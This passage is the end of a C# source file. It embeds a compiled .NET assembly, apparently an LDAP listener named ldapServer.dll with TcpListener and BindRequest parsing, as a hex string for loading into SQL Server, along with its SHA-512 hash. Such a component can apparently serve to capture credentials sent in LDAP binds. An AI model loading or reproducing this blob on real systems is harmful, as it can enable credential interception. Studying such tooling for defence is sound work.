0000314511613062B000011062A00000001100000000001006E6F00051300000113300500A60000001B00001100733200000A0A38850000000002039128150000060B0317581001160C0203120228080000060D03085810010773290000061304076F0D0000062C090916FE0216FE012B011700130611062D150011040203030958282C0000067D41000004002B20001104098D140000017D40000004020311047B400000041609282400000A00000611046F4300000A000309581001000304FE04130611063A6EFFFFFF0613052B0011052A000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000940B0000237E0000000C0000F809000023537472696E677300000000F815000068000000235553006016000010000000234755494400000070160000C004000023426C6F620000000000000002000001571DA209090E000000FA25330016000001000000220000000A000000420000002E0000003200000044000000390000000A0000001B000000030000000C0000000D00000009000000010000000300000001000000010000000700000000000A0001000000000006008A0083000600910083000600A0038D030600DE03D4030600CB04B0040600E20483000600A10582050600500630060600700630060600A80683000600D60630060A004F0744070A00750762070A00870762070A00A10762070E00D107C5070600DC07B004060012088300060029088300060046088300060055088300060070086408060085088D030600B30883000600C90883000600E20883000600EF0883000600F608830006004F09830006006A09830006006F0983000600D80083000600A80964080600D809830000000000010000000000010001008101100019002100050001000100010100002E00210009000300040001010000370021000900080004000101000049002100090028000400810110005700210005003E000400010010005D00210005003E000B00010010006100210005003F001700010010006F002100200042002700030110001F090000050042002D001100AF06E5011100FE06E50106069D000F005680A50012005680AF0012005680BB0012005680C300120006069D000F005680CB002A005680D8002A005680E0002A005680E8002A005680F2002A005680FE002A00568003012A00568014012A00568025012A0056802E012A00568033012A0056803E012A0056804A012A00568055012A0056805E012A00568067012A00568071012A0056807A012A0056807E012A0056808C012A0056809C012A005680A6012A005680B5012A005680BF012A005680C7012A005680D7012A005680E5012A005680F3012A00568001022A00568011022A00568021022A0006069D000F0056802B02B50056803702B50056804402B50056805202B50056806002B50056807202B50056808302B50056809902B5005680A702B5005680B602B5005680C102B5005680CD02B5005680D802B5005680E402B5005680F402B50056800503B50056801403B50056802403B50056803303B50056804303B50056805403B50001005B041F010100A50439010400AA043D010600D204410106003209C003A82000000000960096000A00010050200000000091009906DF0102007C20000000009100F106DF010300C8210000000096006903B900040034220000000096007B03C00006009022000000009600A903C60007003823000000009600B603CC000800C423000000009600C503D20009003024000000009600C503DB000C00AC24000000009600E503E3000E00CC24000000008608EC03E9001000E324000000008308F803ED001000EC240000000086080404F20011001C250000000086081604F600110038250000000086082004FB00110054250000000086082D040001110070250000000086083F04E90011008C250000000086184F0405011100AD250000000086184F040C011300CB250000000086184F0413011500F02500000000960055041901170008260000000081184F04ED0018001C260000000086081604F60019003C260000000086080404F20019005C260000000086082D0449011900A026000000008608200452011900E4260000000086083F045B01190028270000000086184F040501190057270000000086184F0463011B0093270000000086184F040C011E00C2270000000086184F046B012000FE270000000086184F04130123002D280000000086184F047301250069280000000084184F047A012800B028000000008600ED04800129008C29000000008600F60485012900B829000000008600F6048B012900A02A000000008100ED048F012900B42B0000000086080105AF012A00D72B0000000086184F04B3012A00FE2B0000000081184F047A012B000C2C0000000096000F05B8012C004C2C0000000096001B05BF012D00EC2C0000000091002A05C8012F0092280000000086184F04DB0132009A280000000086003709C703320000000100440500000100A60600000100A606000001004905101002004D05000001005C05000001006205000001006705000001005C05000002006E0502000300750500000100AE0502000200750500000100B50500000200BB0500000100BD0500000100C30500000200CD0500000100D80500000200CD0500000100E10500000200CD0500000100E90500000100E90500000100C30500000200F10500000100C30500000200F10500000300BD0500000100D80500000200F10500000100D80500000200F10500000300BD0500000100FF0500000200F10500000100FF0500000200F10500000300BD05000001000B0600000100BD05000001000F06000001000B06000001005C0500000100AE05020002001906000001005C0500000200200600000300670500000100A60639004F04DB0141004F04B30149004F04DB0159004F04DB010C002507F5010C003707F20061005907040269004F04080269008107DB01690091070F027100AF07140214004F0421028100EA0727028100EE073E021C00FE07580271000708DB0169000D08DB0191001908620209002008690291003308810291003B08AF0191004B088702A9005D088D02B1004F04B301910019089D02B1007E08A30219009108B402B9009F088B01A900AB08B9029100B908BE029100B908C402B900C008F200C900D508DB019100DD086902D100ED04CC00D900FC08D60281000609EF0281000E090303D100AB0810032100160920038100E50333039100B908400319004F04510319001B09570309004F04DB01A9005D0871030C004F047F0324004F047F032C004F047F031C004F04DB0134004609D30334004F04DB013C004F0421021C005809E40334006009AF0134000E09EE03F10081090904A90093091004D1009E091C040901B10923040901BA0929040900C4093804F100CC093D040901ED044504D100ED044B0411014F0454041C00F2097F031C004609D303080010001600080014001B0002001500D90108001800200008001C002500080024001600080028001B0008002C002000080030002500080034002E0008003800330008003C003800080040003D0008004400420008004800470008004C004C00080050005100080054005600080058005B0008005C006000080060006500080064006A00080068006F0008006C007400080070007900080074007E0008007800830008007C008800080080008D0008008400920008008800970008008C009C0008009000A10008009400A60008009800AB0008009C00B0000800A40016000800A8001B000800AC0020000800B00025000800B4002E000800B80033000800BC0079000800C00038000800C4003D000800C80042000800CC0047000800D0004C000800D40051000800D80056000800DC005B000800E00060000800E40065000800E8006A000800EC008D000800F00092000800F4009700210023001B002E00130096042E001B009F04400023001B00410023001B00600023001B00430123001B00600123001B00800123001B00C10723001B00FA016D029302A902CA02E1021703280349034D035C03620367036C0376037B0385039C03B203F4031704310459046504690472048004070001000800070009000C0000007404220100007C04260100008A042A01000090042F0100004900340100009904220100008A042A0100007C042601000049009501000090049E0100009904A70100003A05D50102000B00030001000C00030002000D00050002000E00070002000F000900020010000B00020011000D00020017000F0002001800110002001900130002001A00150002001B001700020027001900EE01190251029503AC03CD03DD03060451040480000000000000000000000000000000008E06000004000000000000000000000001007A000000000004000000000000000000000001008300000000000400000000000000000000000100B907000000000A000800000000004900FF041B0039021D00390248005E024B00FF024D00FF0253005E024800610400000000003C4D6F64756C653E006C6461705365727665722E646C6C004C646170537276006C646170417373656D626C7900546167436C61737300556E6976657273616C4461746154797065004C6461704F7065726174696F6E005574696C7300546167004C646170417474726962757465004C6461705061636B6574006D73636F726C69620053797374656D004F626A65637400456E756D006C697374656E0076616C75655F5F00556E6976657273616C004170706C69636174696F6E00436F6E74657874005072697661746500456E644F66436F6E74656E7400426F6F6C65616E00496E746567657200426974537472696E67004F63746574537472696E67004E756C6C004F626A6563744964656E746966696572004F626A65637444657363726970746F720045787465726E616C005265616C00456E756D65726174656400456D6265646465645044560055544638537472696E670052656C6174697665005265736572766564005265736572766564320053657175656E636500536574004E756D65726963537472696E67005072696E7461626C65537472696E6700543631537472696E6700566964656F746578537472696E6700494135537472696E670055544354696D650047656E6572616C697A656454696D650047726170686963537472696E670056697369626C65537472696E670047656E6572616C537472696E6700556E6976657273616C537472696E6700436861726163746572537472696E6700424D50537472696E670042696E64526571756573740042696E64526573706F6E736500556E62696E6452657175657374005365617263685265717565737400536561726368526573756C74456E74727900536561726368526573756C74446F6E6500536561726368526573756C745265666572656E6365004D6F6469667952657175657374004D6F64696679526573706F6E7365004164645265717565737400416464526573706F6E73650044656C526571756573740044656C526573706F6E7365004D6F64696679444E52657175657374004D6F64696679444E526573706F6E736500436F6D706172655265717565737400436F6D70617265526573706F6E7365004162616E646F6E5265717565737400457874656E6465645265717565737400457874656E646564526573706F6E736500496E7465726D656469617465526573706F6E736500537472696E67546F42797465417272617900427974654172726179546F537472696E670053797374656D2E436F6C6C656374696F6E730042697441727261790042697473546F537472696E6700496E74546F4265724C656E677468004265724C656E677468546F496E740053797374656D2E494F0053747265616D00526570656174006765745F54616742797465007365745F54616742797465006765745F4973436F6E7374727563746564006765745F436C617373006765745F4461746154797065006765745F4C6461704F7065726174696F6E006765745F436F6E7465787454797065002E63746F72005061727365003C546167427974653E6B5F5F4261636B696E674669656C640054616742797465004973436F6E737472756374656400436C61737300446174615479706500436F6E7465787454797065005F7461670056616C75650053797374656D2E436F6C6C656374696F6E732E47656E65726963004C6973746031004368696C6441747472696275746573004E756C6C61626C6560310047657442797465730047657456616C75650054006765745F4D65737361676549640050617273655061636B65740054727950617273655061636B657400506172736541747472696275746573004D657373616765496400706F727400686578007472696D576869746573706163650062797465730062697473006C656E677468006F66667365740062657242797465436F756E740053797374656D2E52756E74696D652E496E7465726F705365727669636573004F75744174747269627574650073747265616D007374756666006E0076616C7565006F7065726174696F6E00697353657175656E636500646174615479706500636F6E746578740074616742797465006973436F6E737472756374656400636F6E746578745479706500746167006D6573736167654964007061636B65740063757272656E74506F736974696F6E0053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465006C646170536572766572003C6C697374656E3E625F5F30006F0046756E636032004353243C3E395F5F436163686564416E6F6E796D6F75734D6574686F6444656C65676174653200436F6D70696C657247656E657261746564417474726962757465003C6C697374656E3E625F5F31004353243C3E395F5F436163686564416E6F6E796D6F75734D6574686F6444656C6567617465330047657456616C75654F7244656661756C74006765745F48617356616C75650053797374656D2E4E657400495041646472657373004C6F6F706261636B0053797374656D2E4E65742E536F636B657473005463704C697374656E657200537461727400546370436C69656E7400416363657074546370436C69656E74004E6574776F726B53747265616D0047657453747265616D0053797374656D2E436F72650053797374656D2E4C696E7100456E756D657261626C650049456E756D657261626C65603100416E790053696E676C654F7244656661756C74006765745F4974656D00436C6F73650053746F7000537472696E6700466F726D617400546F537472696E6700457863657074696F6E005265706C616365006765745F4C656E677468004279746500537562737472696E6700436F6E7665727400546F427974650053797374656D2E5465787400537472696E674275696C64657200417070656E640049456E756D657261746F7200476574456E756D657261746F72006765745F43757272656E7400546F496E74333200496E74333200436F6E636174004D6F76654E6578740049446973706F7361626C6500446973706F7365005472696D00426974436F6E7665727465720042756666657200417272617900426C6F636B436F7079005265766572736500546F4172726179005265616400476574003C3E635F5F446973706C6179436C61737332006C697374003C47657442797465733E625F5F300041646452616E676500416374696F6E603100466F7245616368006765745F436F756E7400547970650052756E74696D655479706548616E646C65004765745479706546726F6D48616E646C65004368616E67655479706500546F426F6F6C65616E00456E636F64696E67006765745F5554463800476574537472696E670047657454797065006F705F457175616C69747900496E76616C69644F7065726174696F6E457863657074696F6E00416464000000000100133C0075006E006B006E006F0077006E003E00000F7B0030007D003A007B0031007D0000032000000D7B0030003A00780032007D00002B4E006F007400680069006E006700200066006F0075006E006400200066006F00720020007B0030007D000000000063008CD6EC38324589207D1084EFC3030008B77A5C561934E0890400010E080206080306110C040000000004010000000402000000040300000003061110040400000004050000000406000000040700000004080000000409000000040A000000040B000000040C000000040D000000040E000000040F0000000410000000041100000004120000000413000000041400000004150000000416000000041700000004180000000419000000041A000000041B000000041C000000041D000000041E000000030611140600021D050E020500010E1D050500010E120D0500011D0508080003081D0508100807000208121110080500020E0E0803200005042001010503200002042000110C042000111004200011140620020111140206200201111002052002010502050001121C050206050328000503280002042800110C042800111004280011140306121C03061D0507061512150112200820001511190111140820001511190111100720001511190105072003011114021C072003011110021C0620030105021C05200101121C0420001D05053001001E000320001C0520011D051C082800151119011114082800151119011110072800151119010503200008042001010806000112241D050800020212111012240C00031512150112201D050808032800080101032000010500010212200806151229021220020615111901111404200013000907020215111901111403061231062002011231080420001239042000123D0715122902122002052002011C181110010202151245011E00151229021E0002040A011220121001021E00151245011E00151229021E000206151215011220052001130008030A010E0600030E0E1C1C0320000E13070B0E12351239123D12240E0E1220124D0E020520020E0E0E0520020E0808050002050E08090705081D05081D05020500020E0E1C05200112590E0A07061259050E1D050802042000125D040001081C0500020E1C1C0500020E0E0E0B0707080E1C0E125D0212650A000501127108127108080D07071D0505081D051D05021D050F100101151245011E00151245011E00030A01050C1001011D1E00151245011E00060002081D050808070508081D050802072003081D0508080A0706081D05081D0508020C100102151245011E001E00080800010E151245010E0307010E03070105052001011D050420010208050702021D05040701110C040701111004070111140400010502040701121C030701020520010113000F070315111901111402151119011114061511190111100F0703151119011110021511190111100515111901050D07031511190105021511190105060615121501050520010112200515121501050920010115124501130006151275011220092001011512750113000520001D13001107061D051D0515127501122012281D0502021E000600011279117D0600021C1C12790407011E00060002021D05080500001280850720030E1D0508080607031D051C02042000127907000202127912790520011D050E0500011D0502021D05042001010E0707031D05021D05030A010803070108080704121C080812240D07081D0508121C08081D050202150707151215011220121C08081224151215011220020801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010000F848000000000000000000000E490000002000000000000000000000000000000000000000000000004900000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF25002000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100100000001800008000000000000000000000000000000100010000003000008000000000000000000000000000000100000000004800000058600000540200000000000000000000540234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004B4010000010053007400720069006E006700460069006C00650049006E0066006F0000009001000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E003000000040000F00010049006E007400650072006E0061006C004E0061006D00650000006C006400610070005300650072007600650072002E0064006C006C00000000002800020001004C006500670061006C0043006F00700079007200690067006800740000002000000048000F0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006C006400610070005300650072007600650072002E0064006C006C0000000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004000000C000000203900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";

            // This is the SHA-512 hash for the LDAP server .NET assembly in SQL byte format.
            dllArr[1] = "45077873b42284716609bf5d675d98ffa13c20e53008bb3d3f26c0971bcf7d9adf80c2db84300a81168e63d902532235c8daf852d58f9f2eadcb517fb5b83fb9";

            return dllArr;
        }
    }
}